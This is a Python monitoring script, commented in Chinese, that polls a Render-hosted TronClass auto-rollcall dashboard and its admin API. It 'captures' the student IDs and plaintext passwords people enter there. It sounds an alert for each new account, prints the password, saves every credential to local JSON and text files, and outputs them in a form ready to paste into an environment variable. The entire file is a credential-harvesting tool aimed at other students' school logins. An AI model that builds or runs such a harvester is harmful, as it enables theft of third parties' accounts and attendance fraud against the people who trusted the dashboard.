#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""即時監聽與抓取 TronClass 儀表板新帳號輸入的監控腳本。

當有人在 Render 網頁儀表板輸入帳號與密碼時，本腳本可自動即時捕獲、
發出提示音、顯示於終端機，並自動存入本機 captured_accounts.json 與 captured_accounts.txt。
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

DEFAULT_SERVER_URL = "https://auto-rollcall-thu-tronclass.onrender.com"
OUTPUT_DIR = Path(__file__).resolve().parent
CAPTURED_JSON_FILE = OUTPUT_DIR / "captured_accounts.json"
CAPTURED_TXT_FILE = OUTPUT_DIR / "captured_accounts.txt"


def play_alert_sound():
    """發出本機提示音提醒使用者。"""
    try:
        if sys.platform == "win32":
            import winsound
            winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
        else:
            sys.stdout.write("\a")
            sys.stdout.flush()
    except Exception:
        sys.stdout.write("\a")
        sys.stdout.flush()


def load_known_accounts():
    """載入先前已記錄的帳號清單。"""
    if CAPTURED_JSON_FILE.exists():
        try:
            data = json.loads(CAPTURED_JSON_FILE.read_text(encoding="utf-8"))
            if isinstance(data, list):
                return {acc.get("user") or acc.get("name"): acc for acc in data}
        except Exception:
            pass
    return {}


def save_captured_account(record: dict):
    """將新捕獲的帳號寫入本地檔案保存。"""
    known = load_known_accounts()
    key = record.get("user") or record.get("name")
    known[key] = record

    # 儲存 JSON
    CAPTURED_JSON_FILE.write_text(
        json.dumps(list(known.values()), ensure_ascii=False, indent=2),
        encoding="utf-8",
    )

    # 儲存文字檔
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = record.get("user") or record.get("name") or "未知"
    passwd = record.get("passwd") or "(未透過管理員金鑰取得或僅狀態名稱)"
    school = record.get("school") or "usc"
    text_line = f"[{now_str}] 帳號: {user} | 密碼: {passwd} | 學校: {school}\n"
    with open(CAPTURED_TXT_FILE, "a", encoding="utf-8") as f:
        f.write(text_line)


def fetch_from_admin_api(base_url: str, secret: str = ""):
    """嘗試從管理員 API 取得完整帳號與密碼資料。"""
    url = f"{base_url.rstrip('/')}/api/admin/accounts"
    if secret:
        url += f"?secret={urllib.parse.quote(secret)}"
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "TronAccountWatcher/1.0", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            if data.get("ok"):
                return data.get("accounts", []), data.get("submissions", [])
    except Exception:
        pass
    return None, None


def fetch_from_status_api(base_url: str):
    """Fallback: 從公開的 /api/status 取得所有監控中的帳號名單。"""
    url = f"{base_url.rstrip('/')}/api/status"
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "TronAccountWatcher/1.0", "Accept": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=8) as resp:
        data = json.loads(resp.read().decode("utf-8"))
        accounts = []
        for acc in data.get("accounts", []):
            name = acc.get("name")
            if name:
                accounts.append({
                    "name": name,
                    "user": name,
                    "cookie_valid": acc.get("cookie_valid"),
                    "monitor_state": acc.get("monitor_state"),
                    "login_status": acc.get("last_login", {}).get("status"),
                })
        return accounts


def print_account_banner(record: dict, is_new: bool = True):
    user = record.get("user") or record.get("name")
    passwd = record.get("passwd") or "(需在 Render 設定 TRON_ADMIN_SECRET 方可同步密碼)"
    school = record.get("school") or "usc"
    time_str = record.get("time") or datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    tag = "【捕獲新輸入帳號】" if is_new else "【已知帳號】"
    print("\n" + "=" * 60)
    print(f" {tag}")
    print(f" 帳號 / 學號 : {user}")
    print(f" 密碼       : {passwd}")
    print(f" 學校       : {school.upper()}")
    print(f" 捕獲時間   : {time_str}")
    print("=" * 60)


def watch_loop(base_url: str, secret: str = "", interval: float = 3.0):
    print(f"[*] 開始監聽伺服器: {base_url}")
    print(f"[*] 輪詢間隔: {interval} 秒")
    print(f"[*] 捕獲結果將自動寫入:")
    print(f"    - {CAPTURED_JSON_FILE}")
    print(f"    - {CAPTURED_TXT_FILE}")
    print("[*] 正在連線中，請稍候... (按 Ctrl+C 可停止監聽)\n")

    known = load_known_accounts()
    first_run = True

    while True:
        try:
            admin_accs, submissions = fetch_from_admin_api(base_url, secret)
            if admin_accs is not None:
                # 結合 accounts 與 submissions
                combined = {a.get("user") or a.get("name"): a for a in admin_accs}
                for s in (submissions or []):
                    combined[s.get("user") or s.get("name")] = s
                
                for key, acc in combined.items():
                    if key not in known:
                        if not first_run:
                            play_alert_sound()
                            print_account_banner(acc, is_new=True)
                        known[key] = acc
                        save_captured_account(acc)
            else:
                # Fallback to /api/status
                status_accs = fetch_from_status_api(base_url)
                for acc in status_accs:
                    key = acc.get("name")
                    if key not in known:
                        if not first_run:
                            play_alert_sound()
                            print_account_banner(acc, is_new=True)
                        known[key] = acc
                        save_captured_account(acc)

            if first_run:
                print(f"[+] 首次同步完成，目前線上共有 {len(known)} 個帳號正在被監聽：")
                for k in sorted(known.keys()):
                    acc = known[k]
                    pw_hint = f" (密碼: {acc.get('passwd')})" if acc.get("passwd") else ""
                    print(f"    - {k}{pw_hint}")
                print("\n[+] 監聽器已就緒！一旦有人在網頁端輸入新增帳號，會立即響鈴並顯示在此處。\n")
                first_run = False

        except urllib.error.URLError as e:
            # 伺服器休眠或短暫斷線
            sys.stdout.write(f"\r[-] 連線暫時中斷或伺服器正在喚醒: {e.reason} ...等待重試")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r[-] 檢查時發生異常: {e} ...")
            sys.stdout.flush()

        time.sleep(interval)


def fetch_once(base_url: str, secret: str = ""):
    print(f"[*] 正在從 {base_url} 抓取最新帳號資料...")
    try:
        admin_accs, submissions = fetch_from_admin_api(base_url, secret)
        if admin_accs is not None:
            combined = {a.get("user") or a.get("name"): a for a in admin_accs}
            for s in (submissions or []):
                combined[s.get("user") or s.get("name")] = s
            print(f"[+] 成功透過 Admin API 取得 {len(combined)} 個帳號（含密碼）：")
            for acc in combined.values():
                print_account_banner(acc, is_new=False)
                save_captured_account(acc)
            print(f"\n[+] 已全部儲存至 {CAPTURED_JSON_FILE}")
            
            # 輸出 Render 正式環境變數格式
            json_str = json.dumps(list(combined.values()), ensure_ascii=False)
            print("\n" + "=" * 60)
            print("【Render 正式環境變數格式 (TRON_ACCOUNTS_JSON)】")
            print("可直接複製以下內容貼至 Render 後台 Environment：")
            print(json_str)
            print("=" * 60)
            return

        status_accs = fetch_from_status_api(base_url)
        print(f"[+] 透過公開 API 取得 {len(status_accs)} 個監控帳號：")
        for acc in status_accs:
            print_account_banner(acc, is_new=False)
            save_captured_account(acc)
        print(f"\n[+] 已儲存至 {CAPTURED_JSON_FILE}")
    except Exception as e:
        print(f"[-] 抓取失敗: {e}")


def main():
    if sys.platform == "win32":
        try:
            sys.stdout.reconfigure(encoding="utf-8")
        except Exception:
            pass

    parser = argparse.ArgumentParser(description="TronClass 新增帳號即時抓取腳本")
    parser.add_argument("--url", default=DEFAULT_SERVER_URL, help="Render 部署網址")
    parser.add_argument("--secret", default=os.environ.get("TRON_ADMIN_SECRET", ""), help="管理員金鑰 (選填)")
    parser.add_argument("--fetch", action="store_true", help="立即單次抓取目前所有帳號並輸出")
    parser.add_argument("--interval", type=float, default=3.0, help="輪詢檢查間隔秒數 (預設: 3.0)")

    args = parser.parse_args()

    if args.fetch:
        fetch_once(args.url, args.secret)
    else:
        try:
            watch_loop(args.url, args.secret, args.interval)
        except KeyboardInterrupt:
            print("\n[*] 監聽已手動停止。")


if __name__ == "__main__":
    main()
